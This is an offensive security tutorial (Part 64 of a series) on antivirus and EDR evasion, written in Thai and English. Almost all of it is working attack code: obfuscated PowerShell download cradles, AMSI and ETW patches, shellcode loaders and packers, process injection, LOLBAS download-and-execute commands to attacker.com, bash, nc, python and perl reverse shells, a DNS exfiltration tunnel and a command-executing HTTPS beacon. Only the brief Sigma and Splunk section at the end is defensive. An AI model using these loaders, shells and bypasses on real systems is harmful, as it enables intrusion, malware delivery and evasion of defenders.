# Part 64: Evasion Techniques Advanced

## สารบัญ
1. [AV/EDR Evasion Overview](#overview)
2. [Payload Obfuscation](#obfuscation)
3. [Process Injection Techniques](#process-injection)
4. [Living off the Land (LOLBAS)](#lolbas)
5. [Network Evasion](#network-evasion)
6. [Memory Forensics Evasion](#memory-evasion)
7. [Antivirus Bypass Techniques](#av-bypass)
8. [EDR Bypass](#edr-bypass)
9. [Custom C2 Infrastructure](#c2)
10. [Detection Engineering (Blue Team)](#detection)

---

## 1. AV/EDR Evasion Overview {#overview}

```
Detection Layers:

┌──────────────────────────────────────────┐
│        DETECTION MECHANISMS                    │
├─────────────┬─────────────┬──────────────┤
│  Signature   │  Behavioral  │  Memory/Heuristic │
├─────────────┼─────────────┼──────────────┤
│ • Hash match  │ • API hooks   │ • Memory scan    │
│ • String sig  │ • Process mon │ • ROP detection   │
│ • YARA rules  │ • Network mon │ • Shellcode scan  │
└─────────────┴─────────────┴──────────────┘
```

### Evasion Mindset

```
Evasion Layered Approach:

1. Static Analysis Bypass
   └─ Obfuscate strings, change signatures
   └─ Pack/encrypt payload
   └─ Avoid known bad imports

2. Dynamic Analysis Bypass
   └─ VM detection, anti-debugging
   └─ Sleep/delay execution
   └─ Environment checks

3. Behavioral Bypass
   └─ LOLBins, legitimate tools
   └─ Blend with normal traffic
   └─ Indirect syscalls

4. Memory Evasion
   └─ Process hollowing
   └─ DLL injection
   └─ Reflective loading
```

---

## 2. Payload Obfuscation {#obfuscation}

### PowerShell Obfuscation

```powershell
# โทคฮ์นิค Invoke-Expression (ใช้ใน authorized test)

# ปกติ
# Invoke-Expression (New-Object Net.WebClient).DownloadString('http://c2.com/s.ps1')

# String concatenation
$cmd = 'Invoke' + '-' + 'Expression'
& $cmd '...' 

# Variable obfuscation
${!} = 'IEX'
${@} = '(New-Object Net.WebClient)'
${#} = '.DownloadString'
${$} = '("http://c2.com/s.ps1")'
& ${!} "${@}${#}${$}"

# Base64 encoding
$bytes = [System.Text.Encoding]::Unicode.GetBytes('Write-Host "Hello"')
$b64 = [System.Convert]::ToBase64String($bytes)
powershell -EncodedCommand $b64

# AMSI bypass (obsolete methods for education)
# Note: Modern patching is detected
$a = [Ref].Assembly.GetTypes() | Where-Object { $_.Name -eq 'AmsiUtils' }
$b = $a.GetFields('NonPublic,Static') | Where-Object { $_.Name -eq 'amsiContext' }
$b.SetValue($null, [IntPtr]::Zero)  # patch pointer

# Invoke-Obfuscation เครื่องมือ
Import-Module ./Invoke-Obfuscation/Invoke-Obfuscation.psd1
Invoke-Obfuscation
# TOKEN, AST, STRING, ENCODING, COMPRESS, LAUNCHER
```

### C# Payload Encoding

```csharp
// ตัวอย่าง obfuscated shellcode loader ใน C#
using System;
using System.Runtime.InteropServices;
using System.Text;

class Program
{
    // เขรฮ แทน pinvoke ตรงๆ
    [DllImport("k" + "erne" + "l32")]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, 
        uint flAllocationType, uint flProtect);
    
    [DllImport("k" + "erne" + "l32")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, 
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
        uint dwCreationFlags, IntPtr lpThreadId);
    
    [DllImport("k" + "erne" + "l32")]
    static extern UInt32 WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
    
    static byte[] XorDecode(byte[] data, byte key)
    {
        byte[] decoded = new byte[data.Length];
        for (int i = 0; i < data.Length; i++)
            decoded[i] = (byte)(data[i] ^ key);
        return decoded;
    }
    
    static void Main(string[] args)
    {
        // Shellcode ถูก XOR encode ด้วย 0x41
        byte[] encodedShellcode = new byte[] { /* ... encoded bytes ... */ };
        byte[] shellcode = XorDecode(encodedShellcode, 0x41);
        
        // Anti-sandbox: ตรวจสอบ environment
        if (Environment.UserName == "sandbox" || 
            Environment.MachineName.Contains("SANDBOX"))
            return;
        
        // เรียกใช้ syscall แทน API
        IntPtr mem = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 
            0x3000, 0x40);
        Marshal.Copy(shellcode, 0, mem, shellcode.Length);
        IntPtr thread = CreateThread(IntPtr.Zero, 0, mem, 
            IntPtr.Zero, 0, IntPtr.Zero);
        WaitForSingleObject(thread, 0xFFFFFFFF);
    }
}
```

### Python Obfuscation

```python
#!/usr/bin/env python3
# payload_encoder.py - Encode payloads สำหรับ testing

import base64
import zlib
import marshal
import struct

def encode_payload(code: str) -> str:
    """เข้ารหัส Python code"""
    # Step 1: Compile
    compiled = compile(code, '<string>', 'exec')
    # Step 2: Marshal
    marshalled = marshal.dumps(compiled)
    # Step 3: Compress
    compressed = zlib.compress(marshalled, 9)
    # Step 4: Base64
    encoded = base64.b85encode(compressed).decode()
    
    # Generate decoder stubs
    stub = f"""
import base64, zlib, marshal
exec(marshal.loads(zlib.decompress(base64.b85decode('{encoded}'))))
"""
    return stub

def xor_encode_bytes(data: bytes, key: int) -> bytes:
    """XOR encode bytes"""
    return bytes([b ^ key for b in data])

def multi_layer_encode(shellcode_hex: str) -> str:
    """Multi-layer encoding"""
    raw = bytes.fromhex(shellcode_hex)
    
    # Layer 1: XOR
    layer1 = xor_encode_bytes(raw, 0xAA)
    # Layer 2: reverse
    layer2 = layer1[::-1]
    # Layer 3: base64
    layer3 = base64.b64encode(layer2).decode()
    
    decoder = f"""
import base64, ctypes

def decode(data):
    d1 = base64.b64decode(data)
    d2 = d1[::-1]
    d3 = bytes([b ^ 0xAA for b in d2])
    return d3

sc = decode('{layer3}')
buf = (ctypes.c_char * len(sc))(*sc)
ctypes.windll.kernel32.VirtualProtect(buf, ctypes.c_int(len(sc)), 0x40, ctypes.byref(ctypes.c_long()))
ctypes.windll.kernel32.CreateThread(None, 0, buf, None, 0, None)
ctypes.windll.kernel32.WaitForSingleObject(-1, -1)
"""
    return decoder

# ตัวอย่าง:
test_code = 'print("Hello from obfuscated code!")'
encoded = encode_payload(test_code)
print(encoded)
```

---

## 3. Process Injection Techniques {#process-injection}

### Classic DLL Injection

```c
// dll_injection.c - Classic DLL Injection
#include <windows.h>
#include <stdio.h>

BOOL InjectDLL(DWORD pid, const char* dllPath) {
    HANDLE hProcess = OpenProcess(
        PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) return FALSE;
    
    // หาขนาด DLL path
    size_t pathLen = strlen(dllPath) + 1;
    
    // Allocate memory ในโปรเซสเป้าหมาย
    LPVOID mem = VirtualAllocEx(
        hProcess, NULL, pathLen, 
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    
    // เขียน DLL path
    WriteProcessMemory(hProcess, mem, dllPath, pathLen, NULL);
    
    // หา LoadLibraryA address
    LPVOID loadLib = GetProcAddress(
        GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    
    // สร้าง thread เรียกใช้ LoadLibraryA
    HANDLE hThread = CreateRemoteThread(
        hProcess, NULL, 0, 
        (LPTHREAD_START_ROUTINE)loadLib, mem, 0, NULL);
    
    WaitForSingleObject(hThread, INFINITE);
    
    VirtualFreeEx(hProcess, mem, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProcess);
    return TRUE;
}
```

### Shellcode Injection via Python

```python
#!/usr/bin/env python3
# shellcode_injector.py

import ctypes
import sys

# msfvenom สร้าง: msfvenom -p windows/x64/exec CMD=calc.exe -f py
# (test payload - calculator)
shellcode = bytearray(
    b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
    # ... full shellcode ...
)

def inject_into_process(pid, shellcode):
    PROCESS_ALL_ACCESS = 0x1F0FFF
    MEM_COMMIT = 0x1000
    MEM_RESERVE = 0x2000
    PAGE_EXECUTE_READWRITE = 0x40
    
    # Open target process
    h_process = ctypes.windll.kernel32.OpenProcess(
        PROCESS_ALL_ACCESS, False, pid)
    
    if not h_process:
        print(f"[-] Cannot open process {pid}")
        return
    
    # Allocate memory
    lp_base_addr = ctypes.windll.kernel32.VirtualAllocEx(
        h_process, None, len(shellcode),
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    
    # Write shellcode
    ctypes.windll.kernel32.WriteProcessMemory(
        h_process, lp_base_addr, shellcode, len(shellcode), None)
    
    # Create remote thread
    h_thread = ctypes.windll.kernel32.CreateRemoteThread(
        h_process, None, 0, lp_base_addr, None, 0, None)
    
    ctypes.windll.kernel32.WaitForSingleObject(h_thread, -1)
    
    ctypes.windll.kernel32.VirtualFreeEx(
        h_process, lp_base_addr, 0, 0x8000)
    ctypes.windll.kernel32.CloseHandle(h_thread)
    ctypes.windll.kernel32.CloseHandle(h_process)
    print(f"[+] Injected into PID {pid}")

# Process Hollowing (Ghost Writing)
def process_hollow(target_exe, payload_exe):
    """
    1. Create suspended process (target)
    2. Unmap existing code
    3. Write payload
    4. Resume execution
    """
    # ใช้ subprocess สร้าง SUSPEND state
    import subprocess
    proc = subprocess.Popen([target_exe], creationflags=0x4)  # CREATE_SUSPENDED
    
    print(f"[+] Created suspended process: PID {proc.pid}")
    # ขั้นตอนต่อ: ZwUnmapViewOfSection, write payload, SetThreadContext, ResumeThread
```

### Reflective DLL Injection

```bash
# Reflective DLL Injection - DLL โหลดตัวเองเข้า memory

# ใช้กับ Metasploit
msfvenom -p windows/x64/meterpreter/reverse_tcp \
         LHOST=192.168.1.100 LPORT=4444 \
         -f dll -o payload.dll

# Reflective loader: ทำให้ DLL โหลดตัวเองได้โดยไม่ต้องใช้ LoadLibrary
# https://github.com/stephenfewer/ReflectiveDLLInjection

# รันผ่าน PowerShell
Import-Module ./Invoke-ReflectivePEInjection.ps1
Invoke-ReflectivePEInjection -PEPath payload.dll -ProcId 1234

# หรือ inject เข้า process
$bytes = [IO.File]::ReadAllBytes('payload.dll')
Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId 1234
```

---

## 4. Living off the Land (LOLBAS) {#lolbas}

### Windows LOLBAS

```powershell
# LOLBAS: ใช้เครื่องมือ Windows เพื่อ execute code
# https://lolbas-project.github.io/

# 1. certutil - download และ decode base64
certutil -urlcache -split -f http://attacker.com/payload.exe C:\Windows\Temp\p.exe
certutil -decode encoded.b64 decoded.exe

# 2. mshta - execute JScript/VBScript
mshta http://attacker.com/payload.hta
mshta vbscript:Close(Execute("GetObject(""script:http://attacker.com/p.sct"")"))

# 3. regsvr32 - รัน COM scriptlet
regsvr32 /s /n /u /i:http://attacker.com/p.sct scrobj.dll

# 4. rundll32 - รัน DLL function
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";...
rundll32 shell32.dll,ShellExec_RunDLL cmd.exe

# 5. wscript/cscript - รัน scripts
wscript.exe payload.vbs
cscript.exe payload.js

# 6. msiexec - install MSI from URL
msiexec /q /i http://attacker.com/payload.msi

# 7. wmic - process creation
wmic process call create "cmd.exe /c whoami > C:\temp\out.txt"

# 8. bitsadmin - download
bitsadmin /transfer job http://attacker.com/p.exe C:\temp\p.exe

# 9. forfiles - execute commands
forfiles /p c:\windows\system32 /m notepad.exe /c cmd.exe

# 10. pcalua - execute via program compatibility
pcalua -m cmd.exe

# 11. odbcconf - load DLL
odbcconf.exe /a {REGSVR payload.dll}

# 12. ie4uinit - รัน scriptlet
ie4uinit.exe -BaseSettings
```

### Linux LOLBINS

```bash
# GTFOBins: เครื่องมือ Linux สำหรับ privilege escalation/evasion
# https://gtfobins.github.io/

# Reverse shell ผ่าน standard tools
bash -i >& /dev/tcp/192.168.1.100/4444 0>&1

# ผ่าน nc
nc -e /bin/sh 192.168.1.100 4444

# ผ่าน python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("192.168.1.100",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# ผ่าน perl
perl -e 'use Socket;$i="192.168.1.100";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}'

# File read ผ่าน SUID binaries
sudo tee /etc/passwd  # write as root
sudo find / -exec cat /etc/shadow \;

# Escape restricted shells
python -c 'import pty; pty.spawn("/bin/bash")'
vi -c ':!/bin/bash'
more /etc/hosts  # then !/bin/bash
less /etc/hosts  # then !/bin/bash

# แหล่งข้อมูล: file transfer ผ่าน weird methods
curl https://attacker.com/payload -o /tmp/p  # wget/curl
python3 -m http.server 8080  # serve files
nc -lp 4445 < file.bin  # NC file transfer
```

---

## 5. Network Evasion {#network-evasion}

### DNS Tunneling

```python
#!/usr/bin/env python3
# dns_tunnel.py - C2 ผ่าน DNS

# dnscat2 - DNS tunneling C2
# Server side (attacker)
# ruby dnscat2.rb domain.com

# Client side (victim)
# ./dnscat domain.com

# Custom DNS tunnel
import dns.resolver
import base64

C2_DOMAIN = 'tunnel.attacker.com'

def send_data_via_dns(data):
    """encode data เข้าใน DNS query"""
    encoded = base64.b32encode(data.encode()).decode().lower()
    
    # แบ่งเป็นชุด 63 คารักเตอร์ (max DNS label)
    chunks = [encoded[i:i+60] for i in range(0, len(encoded), 60)]
    
    for i, chunk in enumerate(chunks):
        query = f"{i}.{chunk}.{C2_DOMAIN}"
        try:
            dns.resolver.resolve(query, 'A')
        except:
            pass  # Expected to fail but sends data

def receive_cmd_via_dns():
    """รับ command จาก TXT records"""
    try:
        answers = dns.resolver.resolve(f'cmd.{C2_DOMAIN}', 'TXT')
        for rdata in answers:
            encoded_cmd = str(rdata).strip('"')
            cmd = base64.b32decode(encoded_cmd.upper()).decode()
            return cmd
    except:
        return None

# iodine - DNS tunnel tool
# server: iodined -f -c -P password 10.0.0.1 tunnel.domain.com
# client: iodine -f -P password tunnel.domain.com
```

### HTTPS C2 Traffic

```python
#!/usr/bin/env python3
# https_beacon.py - Beacon trafficเลียนแบบ normal HTTPS

import requests
import time
import base64
import json
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import os

C2_SERVER = 'https://c2.legitimate-looking.com'
AES_KEY = os.urandom(16)  # ใช้ pre-shared key

def encrypt_data(data, key):
    iv = os.urandom(16)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    encrypted = cipher.encrypt(pad(data.encode(), 16))
    return base64.b64encode(iv + encrypted).decode()

def decrypt_data(encoded, key):
    raw = base64.b64decode(encoded)
    iv, ct = raw[:16], raw[16:]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return unpad(cipher.decrypt(ct), 16).decode()

def beacon():
    """Beaconing loop"""
    while True:
        try:
            # Check in to C2
            response = requests.get(
                f'{C2_SERVER}/updates',
                headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
                    'Accept': 'text/html,application/xhtml+xml',
                    'Cookie': f'session={encrypt_data("checkin", AES_KEY)}'
                },
                verify=False,
                timeout=10
            )
            
            if response.status_code == 200:
                # สถานที่ปกติ: redirect หรือ 200
                cmd = response.headers.get('X-Custom-Header')
                if cmd and cmd != '0':
                    result = execute_command(decrypt_data(cmd, AES_KEY))
                    # ส่งผลกลับ
                    requests.post(
                        f'{C2_SERVER}/upload',
                        data=encrypt_data(result, AES_KEY),
                        headers={'Content-Type': 'application/octet-stream'}
                    )
        except:
            pass
        
        # Jitter: พัก random เพื่อป้องกัน pattern detection
        jitter = 30 + (time.time() % 30)
        time.sleep(jitter)

def execute_command(cmd):
    import subprocess
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, 
                               text=True, timeout=30)
        return result.stdout + result.stderr
    except:
        return 'Error executing command'
```

### Traffic Blending Techniques

```bash
# Traffic blending - ทำให้ C2 traffic ดูเหมือน normal

# 1. Domain fronting
# ใช้ CDN เพื่อซ่อน origin
# SNI: microsoft.com (CDN edge)
# Host header: evil.com (actual backend)

# 2. ICMP tunneling
# ptunnel - HTTP over ICMP
apt install ptunnel
# server: ptunnel -x password
# client: ptunnel -p victim.com -lp 8080 -da target.com -dp 80 -x password

# 3. WebSocket C2
# HTTP upgrade to WebSocket = encrypted, long-lived connection
# ดูเหมือน normal web traffic

# 4. Steganography
# ซ่อนการสื่อสารในรูปภาพ
python3 << 'EOF'
from PIL import Image
import numpy as np

def hide_message_in_image(image_path, message, output_path):
    img = Image.open(image_path)
    pixels = np.array(img)
    
    # Convert message to binary
    binary_msg = ''.join(format(ord(c), '08b') for c in message)
    binary_msg += '00000000'  # null terminator
    
    idx = 0
    for i in range(pixels.shape[0]):
        for j in range(pixels.shape[1]):
            for k in range(3):  # RGB
                if idx < len(binary_msg):
                    # Set LSB to message bit
                    pixels[i][j][k] = (pixels[i][j][k] & 0xFE) | int(binary_msg[idx])
                    idx += 1
    
    Image.fromarray(pixels).save(output_path)
    print(f"[+] Message hidden in {output_path}")
EOF
```

---

## 6. Antivirus Bypass Techniques {#av-bypass}

### Custom Payload Packer

```python
#!/usr/bin/env python3
# custom_packer.py - Pack payload เพื่อ bypass AV

import struct
import zlib
import os
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

class PayloadPacker:
    def __init__(self):
        self.key = os.urandom(16)
        self.iv = os.urandom(16)
    
    def encrypt_payload(self, payload: bytes) -> bytes:
        """Encrypt payload with AES-CBC"""
        cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
        return cipher.encrypt(pad(payload, 16))
    
    def compress_and_encrypt(self, payload: bytes) -> bytes:
        """Compress then encrypt"""
        compressed = zlib.compress(payload, 9)
        return self.encrypt_payload(compressed)
    
    def generate_stub(self, encrypted_payload: bytes) -> str:
        """Generate Python loader stub"""
        import base64
        
        key_b64 = base64.b64encode(self.key).decode()
        iv_b64 = base64.b64encode(self.iv).decode()
        payload_b64 = base64.b64encode(encrypted_payload).decode()
        
        stub = f'''
import base64, zlib, ctypes
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

def load():
    key = base64.b64decode('{key_b64}')
    iv = base64.b64decode('{iv_b64}')
    ct = base64.b64decode('{payload_b64}')
    
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decompressed = zlib.decompress(unpad(cipher.decrypt(ct), 16))
    
    buf = (ctypes.c_char * len(decompressed))(*decompressed)
    ctypes.windll.kernel32.VirtualProtect(buf, ctypes.c_int(len(decompressed)), 0x40, ctypes.byref(ctypes.c_long()))
    
    import threading
    t = threading.Thread(target=ctypes.windll.kernel32.CreateThread, 
                        args=(None, 0, buf, None, 0, None))
    t.start()
    ctypes.windll.kernel32.WaitForSingleObject(-1, -1)

load()
'''
        return stub

# สร้าง packed payload
packer = PayloadPacker()
with open('shellcode.bin', 'rb') as f:
    raw_payload = f.read()

packed = packer.compress_and_encrypt(raw_payload)
stub = packer.generate_stub(packed)

with open('loader.py', 'w') as f:
    f.write(stub)
print("[+] Packed payload generated: loader.py")
```

### Testing Against AV

```bash
# ทดสอบ payload กับเครื่องมือ VirusTotal-like (ไม่ใช้ VirusTotal จริงๆ = upload หลักฐาน)

# Antiscan.me (ไม่แชร์กับ AV vendors)
curl -F 'file=@payload.exe' 'https://antiscan.me/'

# หรือรัน AV local
# Install multiple AV บน isolated VM
# Windows Defender test:
MpCmdRun.exe -Scan -ScanType 3 -File payload.exe

# เซ็นไฟล์ payload.exe แล้วดู log
Get-WinEvent -LogName 'Microsoft-Windows-Windows Defender/Operational' |
    Where-Object Id -eq 1116 |
    Select-Object -First 5
```

---

## 7. EDR Bypass {#edr-bypass}

### Direct Syscalls

```c
// direct_syscalls.c - บายพาส NT API hooks
// EDR hooks WinAPI calls - direct syscall หลีก

// SysWhispers3: generate syscall stubs
// https://github.com/klezVirus/SysWhispers3

#include <windows.h>

// ตัวอย่าง: NtAllocateVirtualMemory syscall stub
extern NTSTATUS NtAllocateVirtualMemory(
    HANDLE ProcessHandle, PVOID* BaseAddress,
    ULONG_PTR ZeroBits, PSIZE_T RegionSize,
    ULONG AllocationType, ULONG Protect
);

// Syscall number สำหรับ Windows 10 20H2
#define SYSCALL_ALLOC 0x18

__asm__(
"NtAllocateVirtualMemory:\n"
"    mov r10, rcx\n"
"    mov eax, 0x18\n"   // syscall number
"    syscall\n"
"    ret\n"
);

// Heaven's Gate - ผ่าน x64 จาก 32-bit process
// พี่แม่ hooks ที่ EDR ใส่ใน 32-bit space
```

### ETW และ AMSI Patching

```csharp
// ETW (Event Tracing for Windows) patching
// AMSI (Antimalware Scan Interface) bypass

using System;
using System.Runtime.InteropServices;

class EDRBypass
{
    [DllImport("kernel32")]
    static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,
        uint flNewProtect, out uint lpflOldProtect);
    
    // ETW patch - disable ETW in current process
    static void PatchETW()
    {
        var ntdll = LoadLibrary("ntdll.dll");
        var etwEventWrite = GetProcAddress(ntdll, "EtwEventWrite");
        
        VirtualProtect(etwEventWrite, (UIntPtr)4, 0x40, out uint oldProtect);
        Marshal.Copy(new byte[] { 0x48, 0x33, 0xC0, 0xC3 }, 0,  // xor rax,rax; ret
                    etwEventWrite, 4);
        VirtualProtect(etwEventWrite, (UIntPtr)4, oldProtect, out _);
    }
    
    // AMSI patch
    static void PatchAMSI()
    {
        var amsiDll = LoadLibrary("amsi.dll");
        var amsiScanBuffer = GetProcAddress(amsiDll, "AmsiScanBuffer");
        
        VirtualProtect(amsiScanBuffer, (UIntPtr)6, 0x40, out uint oldProtect);
        // Patch: mov eax, 0x80070057 (AMSI_RESULT_CLEAN); ret
        Marshal.Copy(new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }, 0,
                    amsiScanBuffer, 6);
        VirtualProtect(amsiScanBuffer, (UIntPtr)6, oldProtect, out _);
    }
    
    [DllImport("kernel32")] static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")] static extern IntPtr GetProcAddress(IntPtr hModule, string proc);
}
```

---

## 8. Custom C2 Infrastructure {#c2}

### C2 Design

```
C2 Architecture:

  Attacker                     C2 Server              Victim
  Machine                   (Redirector)              Machine
     │                           │                      │
     ├──SSH tunnel─────────────┤                      │
     │                           ├────────────────────┤
     │                           │   HTTPS Beacon       │
     │                           │<────────────────────┤
     │                           │ C2 Response          │
     │                           │────────────────────>│
```

### Havoc C2 Setup

```bash
# Havoc C2 - modern C2 framework
git clone https://github.com/HavocFramework/Havoc
cd Havoc

# Build client
cd Client && make

# Build server
cd ../Teamserver
go build . -o havoc-server

# Configuration
cat profiles/default.yaotl
"Teamserver" : {
    "Host" : "0.0.0.0",
    "Port" : "40056",
    "Build" : {
        "Compiler64" : "/usr/bin/x86_64-w64-mingw32-gcc",
        "Nasm" : "/usr/bin/nasm"
    }
},
"Listeners" : [
    {
        "Name" : "HTTPS Listener",
        "Protocol" : "Https",
        "Host" : "0.0.0.0",
        "Port" : "443",
        "Cert" : {
            "Cert" : "server.crt",
            "Key" : "server.key"
        }
    }
]

# รัน server
./havoc-server server --profile profiles/default.yaotl

# เชื่อมต่อด้วย client
./Havoc  # GUI client
```

---

## 9. Detection Engineering (Blue Team) {#detection}

### SIGMA Rules

```yaml
# sigma_evasion_detect.yml - ตรวจจับ evasion techniques

title: Suspicious Process Injection
status: experimental
description: Detect process injection patterns
author: Security Team
logsource:
    product: windows
    category: process_creation
detection:
    selection:
        ParentImage|endswith:
            - '\\cmd.exe'
            - '\\powershell.exe'
        CommandLine|contains:
            - 'WriteProcessMemory'
            - 'CreateRemoteThread'
            - 'VirtualAllocEx'
    condition: selection
falsepositives:
    - Legitimate admin tools
level: high

---
title: LOLBAS Download
status: stable
description: Detect file download via LOLBAS
logsource:
    product: windows
    category: process_creation
detection:
    selection:
        Image|endswith:
            - '\\certutil.exe'
            - '\\bitsadmin.exe'
            - '\\mshta.exe'
        CommandLine|contains:
            - 'http://'
            - 'https://'
            - 'urlcache'
    condition: selection
falsepositives:
    - IT administration
level: medium
```

### Splunk Detection Queries

```sql
-- Detect PowerShell obfuscation
index=windows EventCode=4104
| search ScriptBlockText="*-EncodedCommand*" OR ScriptBlockText="*IEX*" OR ScriptBlockText="*Invoke-Expression*"
| table _time, Computer, User, ScriptBlockText

-- Detect DNS tunneling
index=dns
| eval query_len=len(query)
| where query_len > 50
| stats count by src_ip, query_len
| where count > 100
| sort - count

-- Process injection indicators
index=sysmon EventCode=8
| where SourceImage!="C:\\Windows\\System32\\csrss.exe"
| table _time, SourceImage, TargetImage, StartAddress
```

---

## สรุป

| Technique | Bypasses | Detection |
|-----------|----------|----------|
| Payload Obfuscation | Signature AV | Behavioral AV |
| Process Injection | Disk scanning | API monitoring |
| LOLBAS | Binary whitelist | Command line logging |
| Direct Syscalls | API hooks | Syscall tracing |
| DNS Tunneling | Firewall | DNS analytics |
| ETW Patching | Event logging | Integrity check |

---

← [Part 63: OSINT Advanced](Part-63-OSINT-Advanced.md) | [Part 65: Custom Tool Development](Part-65-Custom-Tools.md) →
